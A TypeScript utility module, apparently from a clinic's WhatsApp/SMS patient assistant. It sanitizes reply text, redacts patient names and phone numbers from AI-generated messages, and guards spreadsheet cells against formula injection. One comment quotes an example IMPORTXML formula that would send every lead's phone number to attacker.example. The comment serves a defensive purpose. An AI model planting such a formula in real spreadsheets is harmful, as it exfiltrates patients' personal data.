export const SMS_MAX_CHARS = 120;

// Masks a phone-like value for console output, keeping only the last 4 digits
// ("whatsapp:+905551113049" → "***3049"). Log/console use ONLY — stored data
// (Redis state, Sheets rows, compliance keys) must keep the raw number.
export function maskPhone(phone: string): string {
  const digits = phone.replace(/\D/g, "");
  return `***${digits.slice(-4)}`;
}

// Spreadsheet formula-injection guard. Google Sheets and Excel evaluate any cell
// whose text starts with "=", "+", "-", "@", or a leading tab/CR as a live formula.
// Patient-supplied text reaches the leads sheet verbatim (name, notes,
// conversation_summary), so a message like
//   =IMPORTXML(CONCAT("https://attacker.example/?d=",JOIN(",",D:D)),"//a")
// would execute the moment the clinic opens the sheet and exfiltrate every lead's
// phone number. Prefixing with a single quote forces Sheets to store and render the
// value as literal text. This is the second layer — writes must ALSO use
// valueInputOption "RAW" (see lib/googleSheets.ts), which stops evaluation at the
// API boundary. Values that do not start with a trigger character pass through
// unchanged, so this is a no-op for ordinary text.
export function sanitizeSpreadsheetCell(value: string): string {
  if (!value) return value;
  return /^[=+\-@\t\r]/.test(value) ? `\x27${value}` : value;
}

const APO = "\x27";

const CONTRACTIONS: Array<[RegExp, string]> = [
  [new RegExp("\\bcan" + APO + "t\\b", "gi"), "cannot"],
  [new RegExp("\\bwon" + APO + "t\\b", "gi"), "will not"],
  [new RegExp("\\bdon" + APO + "t\\b", "gi"), "do not"],
  [new RegExp("\\bdoesn" + APO + "t\\b", "gi"), "does not"],
  [new RegExp("\\bdidn" + APO + "t\\b", "gi"), "did not"],
  [new RegExp("\\bisn" + APO + "t\\b", "gi"), "is not"],
  [new RegExp("\\baren" + APO + "t\\b", "gi"), "are not"],
  [new RegExp("\\bwasn" + APO + "t\\b", "gi"), "was not"],
  [new RegExp("\\bweren" + APO + "t\\b", "gi"), "were not"],
  [new RegExp("\\bhasn" + APO + "t\\b", "gi"), "has not"],
  [new RegExp("\\bhaven" + APO + "t\\b", "gi"), "have not"],
  [new RegExp("\\bhadn" + APO + "t\\b", "gi"), "had not"],
  [new RegExp("\\bshouldn" + APO + "t\\b", "gi"), "should not"],
  [new RegExp("\\bwouldn" + APO + "t\\b", "gi"), "would not"],
  [new RegExp("\\bcouldn" + APO + "t\\b", "gi"), "could not"],
];

// Turkish characters to preserve (Ç ç Ğ ğ İ ı Ö ö Ş ş Ü ü)
const TURKISH_CHARS = "ÇçĞğİıÖöŞşÜü";

// Strips Markdown constructs that WhatsApp renders as literal artifacts.
// Must run BEFORE newline collapsing — heading/bullet markers are anchored to line starts.
// [label](url) becomes "label: url" so links stay readable as plain text.
function stripMarkdownArtifacts(text: string): string {
  let s = text;
  s = s.replace(/```[a-zA-Z]*\n?/g, " ");                 // code fences
  s = s.replace(/`([^`]*)`/g, "$1");                       // inline code
  s = s.replace(/\[([^\]]+)\]\(([^)\s]+)\)/g, "$1: $2");   // [Google Maps](url) → Google Maps: url
  s = s.replace(/\*\*([^*]+)\*\*/g, "$1");                 // **bold** → bold (single *bold* is WhatsApp-native)
  s = s.replace(/__([^_]+)__/g, "$1");                     // __bold__ → bold
  s = s.replace(/^[ \t]*#{1,6}[ \t]+/gm, "");              // headings
  s = s.replace(/^[ \t]*[-*•][ \t]+/gm, "");               // bullet list markers
  s = s.replace(/^[ \t]*>[ \t]+/gm, "");                   // blockquotes
  return s;
}

function sanitizeBase(text: string): string {
  let s = text;

  s = s.replace(/['']/g, "\x27");
  s = s.replace(/[""]/g, "\x22");

  for (const [pattern, replacement] of CONTRACTIONS) {
    s = s.replace(pattern, replacement);
  }

  s = stripMarkdownArtifacts(s);

  s = s.replace(/[—–―]/g, "-");
  s = s.replace(/…/g, "...");
  s = s.replace(/[\r\n\t]+/g, " ");

  // Remove control characters and invisible formatting chars. Printable text in ALL
  // supported languages (Turkish, Arabic, Cyrillic, accented Latin) passes through —
  // multilingual replies must never be blanked here. Apostrophes are preserved so
  // Turkish suffixes stay correct ("2.500 TL'den", never "2.500den").
  s = s.replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F-\u009F\u200B-\u200F\u2028\u2029\u2060\uFEFF]/g, "");

  s = s.replace(/ {2,}/g, " ").trim();

  return s;
}

// Filters markdown/control characters but preserves ALL languages' letters and does NOT
// truncate — use for AI/WhatsApp replies stored in history or returned to non-SMS
// endpoints. SMS charset filtering and truncation are applied only at SMS send time.
export function sanitizeReplyText(text: string): string {
  return sanitizeBase(text);
}

// Ensures "Welcome to {clinicName}" is followed by a period before the next sentence.
// Fixes AI-generated replies that omit sentence-terminal punctuation after the clinic name.
// Only acts when the clinic name is immediately followed by a space and a letter (no existing punctuation).
export function ensureClinicNamePunctuation(text: string, clinicName: string): string {
  if (!clinicName || clinicName === "the clinic") return text;
  const escaped = clinicName.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const re = new RegExp(`(Welcome to ${escaped}) ([A-Za-zÇçĞğİıÖöŞşÜü])`, "g");
  return text.replace(re, "$1. $2");
}

// ── Patient identifier redaction (audit finding O-2) ──────────────────────────
// Last line of defence on OUR OWN outgoing text. lib/prompt.ts no longer sends the
// patient's name or phone to the model, and the deterministic templates no longer
// embed them — but the model still SEES the identifiers in the raw history turns the
// patient typed, so it can echo them back ("Teşekkürler Zeynep"). That reply is sent
// AND written to state.history, which puts the identifier back into the next
// cross-border request. This guard removes them deterministically.
//
// Applies ONLY to assistant-generated text. Patient message turns are never passed
// here — redacting a patient's own free text is error-prone and is a deliberate
// non-goal (their identifiers in history are covered by consent + the DPA).

// Name tokens shorter than this are NOT redacted. Rationale: a 1-2 character token
// carries almost no identifying power on its own, but matches constantly inside
// ordinary words and initials, so redacting it would mangle legitimate replies far
// more often than it would protect anything. Three characters is the shortest length
// at which a real given name exists (e.g. "Ali", "Eda") — so genuine short names are
// still covered, while "A." or "Ö" are left alone.
const MIN_REDACTABLE_NAME_TOKEN = 3;

// A candidate number in the reply must carry at least this many digits before it is
// even compared against the patient's number. Keeps prices ("2.500"), times ("14:00"),
// graft counts and session numbers out of the phone matcher entirely.
const MIN_PHONE_DIGITS = 9;

function escapeRegex(value: string): string {
  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

// Builds the needle list for a stored name: the full name first (so "Zeynep Kaya" is
// removed as one unit), then each individual token. Longest-first ordering matters —
// removing "Zeynep" first would leave a dangling "Kaya".
function nameNeedles(name: string): string[] {
  const cleaned = name.replace(/\s+/g, " ").trim();
  if (!cleaned) return [];
  const needles = new Set<string>();
  if (cleaned.length >= MIN_REDACTABLE_NAME_TOKEN) needles.add(cleaned);
  for (const token of cleaned.split(" ")) {
    if (token.length >= MIN_REDACTABLE_NAME_TOKEN) needles.add(token);
  }
  // Array.from (not spread) — the scripts tsconfig targets ES5 and cannot iterate a Set.
  return Array.from(needles).sort((a, b) => b.length - a.length);
}

// Word boundaries are expressed with Unicode property lookarounds instead of \b:
// JavaScript's \b is ASCII-only, so "\bŞule\b" would never match after a space.
// The pattern also swallows what normally travels WITH a name in these languages,
// so removal does not leave debris in the sent message:
//   - a leading honorific ("Sayın Zeynep" → "")
//   - a Turkish apostrophe suffix ("Zeynep'e" → "")
//   - the same case suffixes written WITHOUT the apostrophe, which the model often does
//     ("Zeynepe", "Zeynepin" → ""). This is a CLOSED list of case/possessive suffixes,
//     not "any few letters": an open-ended match would swallow unrelated words that merely
//     start with the name. Plural "-ler/-lar" is deliberately excluded — "Zeynepler" is a
//     different word, and a longer word that merely CONTAINS the name is left intact.
//   - a trailing honorific ("Zeynep Hanım" → "")
const TR_CASE_SUFFIXES = [
  "nin", "n\u0131n", "nun", "n\u00fcn", "den", "dan", "ten", "tan",
  "yle", "yla", "in", "\u0131n", "un", "\u00fcn", "de", "da", "te", "ta",
  "le", "la", "ye", "ya", "yi", "y\u0131", "yu", "y\u00fc",
  "im", "\u0131m", "um", "\u00fcm", "e", "a", "i", "\u0131", "u", "\u00fc",
].join("|");

function namePattern(needle: string): RegExp {
  const NOT_WORD = "(?<![\\p{L}\\p{N}])";
  const NOT_WORD_AFTER = "(?![\\p{L}\\p{N}])";
  const LEADING_TITLE = "(?:Say\\u0131n\\s+)?";
  const SUFFIX = `(?:['\\u2019]\\p{L}{1,4}|${TR_CASE_SUFFIXES})?`;
  const TRAILING_TITLE =
    "(?:\\s+(?:Han\\u0131mefendi|Han\\u0131m|Beyefendi|Bey|Bayan|Bay))?";
  return new RegExp(
    `${NOT_WORD}${LEADING_TITLE}${escapeRegex(needle)}${SUFFIX}${TRAILING_TITLE}${NOT_WORD_AFTER}`,
    "giu"
  );
}

// Repairs the punctuation/spacing left behind once a needle is cut out, so the patient
// receives "Teşekkürler, randevunuz..." and not "Teşekkürler , randevunuz...".
function tidyAfterRedaction(text: string): string {
  return text
    .replace(/\s+([,.!?;:])/g, "$1")
    .replace(/([(\[])\s+/g, "$1")
    .replace(/,\s*,/g, ",")
    .replace(/(^|[.!?]\s+)[,;:]\s*/g, "$1")
    .replace(/ {2,}/g, " ")
    .trim();
}

export interface RedactionResult {
  text: string;
  // True when at least one identifier was actually removed — the caller logs this as a
  // compliance signal (the model ignored the "never state the name" prompt rule).
  redacted: boolean;
}

export function redactPatientIdentifiers(
  text: string,
  identifiers: { name?: string; phone?: string }
): RedactionResult {
  if (!text) return { text, redacted: false };
  let out = text;

  if (identifiers.name) {
    for (const needle of nameNeedles(identifiers.name)) {
      out = out.replace(namePattern(needle), "");
    }
  }

  // Phone matching is done on digits, not on formatting: the model may reformat the
  // number ("+90 532 123 45 67", "0532 123 45 67"). Every number-like run is normalized
  // to digits and compared against the last MIN_PHONE_DIGITS digits of the stored
  // number, which is the part that survives country-code and leading-zero variation.
  // Only the PATIENT's number is matched, so the clinic's own published numbers pass through.
  if (identifiers.phone) {
    const storedDigits = identifiers.phone.replace(/\D/g, "");
    if (storedDigits.length >= MIN_PHONE_DIGITS) {
      const tail = storedDigits.slice(-MIN_PHONE_DIGITS);
      out = out.replace(/\+?\d[\d\s\-().]{5,}\d/g, (match) => {
        const digits = match.replace(/\D/g, "");
        return digits.length >= MIN_PHONE_DIGITS && digits.endsWith(tail) ? "" : match;
      });
    }
  }

  if (out === text) return { text, redacted: false };
  return { text: tidyAfterRedaction(out), redacted: true };
}

// SMS transport sanitization: GSM-safe charset (ASCII + Turkish letters, emoji stripped)
// and hard length cap. Applied at SMS send time only — WhatsApp replies keep full
// multilingual text via sanitizeReplyText.
export function sanitizeSmsText(text: string): string {
  let s = sanitizeBase(text);
  s = s.replace(new RegExp(`[^\\x20-\\x7E${TURKISH_CHARS}]`, "g"), "");
  s = s.replace(/ {2,}/g, " ").trim();
  return s.length > SMS_MAX_CHARS ? s.slice(0, SMS_MAX_CHARS) : s;
}
